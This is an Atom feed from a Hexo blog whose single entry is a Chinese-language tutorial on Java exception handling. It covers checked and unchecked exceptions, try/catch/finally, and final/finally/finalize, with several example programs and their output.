<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://sun-spots.github.io/atom.xml" rel="self"/>
  
  <link href="https://sun-spots.github.io/"/>
  <updated>2022-04-12T07:24:26.298Z</updated>
  <id>https://sun-spots.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>java异常基础知识</title>
    <link href="https://sun-spots.github.io/2022/04/10/java%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"/>
    <id>https://sun-spots.github.io/2022/04/10/java%E5%BE%AE%E6%9C%8D%E5%8A%A1/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</id>
    <published>2022-04-10T12:05:00.000Z</published>
    <updated>2022-04-12T07:24:26.298Z</updated>
    
    <content type="html"><![CDATA[<h2 id="异常"><a class="markdownIt-Anchor" href="#异常"></a> 异常</h2><p>异常的概念：异常是造成程序中断的一种指令流，如果不对异常进行处理则可以导致程序的中断运行，造成不必要的损失，所以在程序设计中必须考虑各种异常的发生，并正确的做好相应的处理，这样保证程序的正常运行。</p><p><a href="https://imgtu.com/i/LeR760"><img data-src="https://s1.ax1x.com/2022/04/12/LeR760.png" alt="LeR760.png" /></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">**java的异常处理机制**：Object是java中任何类的超类。Object下有Throwable（可抛出的），异常对都是派生于Throwable类的一个实例。当java中的内置异常类无法满足用户需要时，可以继承异常类进行编写自己的异常类库。Throwable下有两个分支：Error（不可处理，直接退出JVM）和Exception（可处理的）</span><br><span class="line">Exception下有两个分支：</span><br><span class="line">**编译时异常**（受检异常：CheckedException、受控异常）：</span><br><span class="line">要求程序员在编写程序阶段必须预先对这些异常进行处理，如果不处理编译器则会报错。包括Exception，但不包括其子类RuntimeException</span><br><span class="line">**运行时异常**（未受检异常：UnCheckedException、非受控异常）：在编写程序阶段程序员可以预先处理，也可以不管，当程序出现错误时，可以对出现的异常进行检测或者抛出。</span><br><span class="line">包括：RuntimeException及其子类</span><br><span class="line"></span><br><span class="line">编译时异常和运行时异常，都是发生在运行阶段。编译阶段异常是不会发生的。</span><br><span class="line">所有异常都是在运行阶段发生的。因为只有程序运行阶段才</span><br><span class="line">可以new对象。</span><br><span class="line">因为异常的发生就是new异常对象。</span><br><span class="line"></span><br><span class="line">编译时异常和运行时异常的区别？</span><br><span class="line">编译时异常一般发生的概率比较高。</span><br><span class="line">运行时异常一般发生的概率比较低。</span><br><span class="line"></span><br><span class="line">Java语言中对异常的处理包括两种方式：</span><br><span class="line">第一种方式：在方法声明的位置上，使用throws关键字，抛给上一级。谁调用我，我就抛给谁。</span><br><span class="line"></span><br><span class="line">第二种方式：使用try..catch语句进行异常的捕捉。这件事发生了，谁也不知道，因为我给抓住了。</span><br><span class="line"></span><br><span class="line">注意：Java中异常发生之后如果一直上抛，最终抛给了main方法，main方法继续向上抛，抛给了调用者JVM，JVM知道这个异常发生，只有一个结果。终止java程序的执行。</span><br></pre></td></tr></table></figure><p><strong>异常的捕获机制：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="comment">//有可能产生异常的代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>( 异常类  异常对象)&#123;</span><br><span class="line"><span class="comment">//捕捉异常信息</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(异常类  异常对象)&#123;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line">..... <span class="comment">//至少匹配一个catch</span></span><br><span class="line"><span class="keyword">finally</span>&#123;</span><br><span class="line"><span class="comment">//不管有没有异常都会被执行到的程序</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>异常的继承关系分析</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Throwable:</span><br><span class="line">子类：Exception/Error</span><br><span class="line">​Exception的分类： RuntimeException/Exception、</span><br><span class="line">​RuntimeException:运行时异常，如果以后碰到RuntimeException，可以不用显式去处理.交给jvm去处理.</span><br><span class="line">​Exception:必须进行显式的处理</span><br><span class="line">既然Throwable是Exception的父类，所有异常是不是可以用Throwable进行接收<span class="comment">//不可以的,因为Throwable也是Error的父类,异常的父类都是Exception</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        IOException ioException = <span class="keyword">new</span> IOException(<span class="string">&quot;手动new出异常&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">运行结果：Hello World</span><br><span class="line">注意：自己手动用<span class="keyword">new</span>动态申请出异常跟正常代码一样,不会影响下面代码的执行。非手动<span class="keyword">new</span>出异常则底层会帮我们产生相应的异常对象,然后抛给调用者,如果调用者不处理,则运行会报错将会终止运行,之后的代码就不会执行。</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">   <span class="comment">//这里底层会产生java.lang.ArithmeticException,然后抛给main方法这个调用者</span></span><br><span class="line">   <span class="keyword">int</span> i = <span class="number">1</span>/<span class="number">0</span>; </span><br><span class="line">   <span class="comment">//因为这里没有处理java.lang.ArithmeticException,所以抛给JVM,结果就是直接报错,下面的代码不会运行</span></span><br><span class="line">   System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">运行结果：运行结果:Exception in thread <span class="string">&quot;main&quot;</span> java.lang.ArithmeticException: / by zero</span><br></pre></td></tr></table></figure><p><strong>获取异常的两个非常重要的方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">异常对象有两个非常重要的方法：</span><br><span class="line">-    获取异常简单的描述信息：String msg = exception.getMessage();</span><br><span class="line">-    打印异常追踪的堆栈信息：exception.printStackTrace();</span><br><span class="line">-    获取造成异常描述信息：exception.getcause();</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExceptionTest08</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// 这里只是为了测试getMessage()方法和printStackTrace()方法。</span></span><br><span class="line">       <span class="comment">// 这里只是new了异常对象，但是没有将异常对象抛出。JVM会认为这是一个普通的java对象。</span></span><br><span class="line">       NullPointerException e = <span class="keyword">new</span> NullPointerException(<span class="string">&quot;空指针异常fdsafdsafdsafds&quot;</span>);</span><br><span class="line">       <span class="comment">// 获取异常简单描述信息：这个信息实际上就是构造方法上面String参数。</span></span><br><span class="line">       String msg = e.getMessage(); <span class="comment">//空指针异常fdsafdsafdsafds</span></span><br><span class="line">       System.out.println(msg);</span><br><span class="line">       <span class="comment">// 打印异常堆栈信息</span></span><br><span class="line">       e.printStackTrace();</span><br><span class="line">       System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>关于try…catch中的finally子句</strong><br />在finally子句中的代码是最后执行的，并且是一定会执行的，即使try语句块中的代码出现了异常。<br />finally子句必须和try一起出现，不能单独编写。<br />finally语句通常使用在哪些情况下呢？<br />通常在finally语句块中完成资源的释放/关闭。<br />因为finally中的代码比较有保障。<br />即使try语句块中的代码出现异常，finally中代码也会正常执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExceptionTest10</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       FileInputStream fis = <span class="keyword">null</span>; <span class="comment">// 声明位置放到try外面。这样在finally中才能用。</span></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// 创建输入流对象</span></span><br><span class="line">           fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;D:\\course\\02-JavaSE\\document\\JavaSE进阶讲义\\JavaSE进阶-01-面向对象.pdf&quot;</span>);</span><br><span class="line">           <span class="comment">// 开始读文件....</span></span><br><span class="line"></span><br><span class="line">           String s = <span class="keyword">null</span>;</span><br><span class="line">           <span class="comment">// 这里一定会出现空指针异常！</span></span><br><span class="line">           s.toString();</span><br><span class="line">           System.out.println(<span class="string">&quot;hello world!&quot;</span>);</span><br><span class="line">           <span class="comment">// 流使用完需要关闭，因为流是占用资源的。</span></span><br><span class="line">           <span class="comment">// 即使以上程序出现异常，流也必须要关闭！</span></span><br><span class="line">           <span class="comment">// 放在这里有可能流关不了。</span></span><br><span class="line">           <span class="comment">//fis.close();</span></span><br><span class="line">       &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">catch</span>(NullPointerException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           System.out.println(<span class="string">&quot;hello 浩克！&quot;</span>);</span><br><span class="line">           <span class="comment">// 流的关闭放在这里比较保险。</span></span><br><span class="line">           <span class="comment">// finally中的代码是一定会执行的。</span></span><br><span class="line">           <span class="comment">// 即使try中出现了异常！</span></span><br><span class="line">           <span class="keyword">if</span> (fis != <span class="keyword">null</span>) &#123; <span class="comment">// 避免空指针异常！</span></span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="comment">// close()方法有异常，采用捕捉的方式。</span></span><br><span class="line">                   fis.close();</span><br><span class="line">               &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       System.out.println(<span class="string">&quot;hello kitty!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">finally</span>面试题</span><br><span class="line"><span class="keyword">package</span> com.yxj.javase.exception;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExceptionTest13</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> result = m();</span><br><span class="line">       System.out.println(result); <span class="comment">//100</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">   java语法规则（有一些规则是不能破坏的，一旦这么说了，就必须这么做！）：</span></span><br><span class="line"><span class="comment">       java中有一条这样的规则：</span></span><br><span class="line"><span class="comment">           方法体中的代码必须遵循自上而下顺序依次逐行执行（亘古不变的语法！）</span></span><br><span class="line"><span class="comment">       java中还有一条语法规则：</span></span><br><span class="line"><span class="comment">           return语句一旦执行，整个方法必须结束（亘古不变的语法！）</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">m</span><span class="params">()</span></span>&#123;</span><br><span class="line">       <span class="keyword">int</span> i = <span class="number">100</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// 这行代码出现在int i = 100;的下面，所以最终结果必须是返回100</span></span><br><span class="line">           <span class="comment">// return语句还必须保证是最后执行的。一旦执行，整个方法结束。</span></span><br><span class="line">           <span class="keyword">return</span> i;</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           i++;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">反编译之后的效果</span></span><br><span class="line"><span class="comment">public static int m()&#123;</span></span><br><span class="line"><span class="comment">   int i = 100;</span></span><br><span class="line"><span class="comment">   int j = i;</span></span><br><span class="line"><span class="comment">   i++;</span></span><br><span class="line"><span class="comment">   return j;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><strong>final、finally、finalize有什么区别</strong></p><p>final 关键字：final修饰的类无法继承<br />final修饰的方法无法覆盖<br />final修饰的变量不能重新赋值。</p><p>finally 关键字：和try一起联合使用，finally语句块中的代码是必须执行的。</p><p>finalize 标识符：是一个Object类中的方法名。这个方法是由垃圾回收器GC负责调用的。</p><p><strong>异常的总结：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExceptionTest</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">   test();<span class="comment">//如果这里不处理的话，下面的代码不会执行</span></span><br><span class="line">   System.out.println(<span class="string">&quot;不执行&quot;</span>);</span><br><span class="line">   &#125; </span><br><span class="line">   <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="comment">//这里可以省略throws ArithmeticException，因为属于运行时异常，可以不用处理，自然也就可以省略了，结果一样</span></span><br><span class="line">   <span class="keyword">int</span> i = <span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//java.lang.ArithmeticException: / by zero 这个属于运行时异常，底层会自动生成异常对象，然后抛给调用者</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">运行结果:Exception in thread <span class="string">&quot;main&quot;</span> java.lang.ArithmeticException: / by zero</span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExceptionTest</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">   <span class="keyword">int</span> i = <span class="number">1</span>/<span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">运行结果:执行    因为main方法中对异常进行了捕获，所以程序会执行之后的代码。</span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExceptionTest</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">       <span class="comment">//跟普通对象一样,不会影响代码的执行,不管是编译时异常还是运行时异常</span></span><br><span class="line">        NullPointerException nullPointerException = <span class="keyword">new</span> NullPointerException(); </span><br><span class="line">        ClassNotFoundException classNotFoundException = <span class="keyword">new</span> ClassNotFoundException();</span><br><span class="line">        System.out.println(<span class="string">&quot;普通对象&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">运行结果:普通对象  （手动用<span class="keyword">new</span>创建的异常对象不会对程序的执行造成影响）</span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExceptionTest</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        test(); <span class="comment">//如果这里不处理的话，下面的代码不会执行，此时需要使用throws进行异常的抛出或者，使用try对异常进行捕获</span></span><br><span class="line">        System.out.println(<span class="string">&quot;不执行&quot;</span>);</span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">       <span class="comment">//这里可以省略throws NullPointerException，因为属于运行时异常，可以不用处理，自然也就可以省略了，结果一样</span></span><br><span class="line">   <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();<span class="comment">//这个属于运行时异常，会手动抛给调用者</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line">运行结果:Exception in thread <span class="string">&quot;main&quot;</span> java.lang.NullPointerException</span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExceptionTest</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">   test(); </span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">&#125;  </span><br><span class="line">   System.out.println(<span class="string">&quot;执行&quot;</span>); </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;  <span class="comment">//这里可以省略throws NullPointerException，因为属于运行时异常，可以不用处理，自然也就可以省略了，结果一样</span></span><br><span class="line">   <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();<span class="comment">//这个属于运行时异常，会手动抛给调用者</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line">运行结果:执行</span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExceptionTest</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">test(); <span class="comment">//这里需要在编写时处理,因为接收到的是编译时异常,要么try---catch处理,要么throws,否则编译不通过.</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">&#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;编译时异常&quot;</span>);</span><br><span class="line">   &#125;   </span><br><span class="line">   <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;  <span class="comment">//如果采用throws,这里就不可以省略throws ClassNotFoundException，因为属于编译时异常，要处理，自然就不可以省略了</span></span><br><span class="line">   <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException();<span class="comment">//这个属于编译时异常，需要用try---catch处理或者throws</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line">运行结果:编译时异常</span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExceptionTest</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    test();</span><br><span class="line">    System.out.println(<span class="string">&quot;执行&quot;</span>);</span><br><span class="line">   &#125; </span><br><span class="line">   <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span>  </span>&#123;  <span class="comment">//如果采用throws,这里就不可以省略throws ClassNotFoundException，因为属于编译时异常，要处理，自然就不可以省略了</span></span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException();</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;<span class="comment">//这个属于编译时异常，需要用try---catch处理或者throws</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line">运行结果:java.lang.ClassNotFoundException</span><br><span class="line">执行</span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">   aa();<span class="comment">//这里接受到的是ClassNotFoundException,处于编译时异常，不处理编译器报错</span></span><br><span class="line">   System.out.println(<span class="string">&quot;Hello World1&quot;</span>); <span class="comment">//这里不执行</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (NullPointerException e) &#123; <span class="comment">//没处理ClassNotFoundException</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">   System.out.println(<span class="string">&quot;Hello World2&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">aa</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">   <span class="comment">//这里底层会产生java.lang.ArithmeticException,然后抛给main方法这个调用者</span></span><br><span class="line">   <span class="keyword">int</span> i = <span class="number">1</span>/<span class="number">0</span>; </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">----------------------------------------------------------------------------</span><br><span class="line">编译不通过,没运行结果.</span><br><span 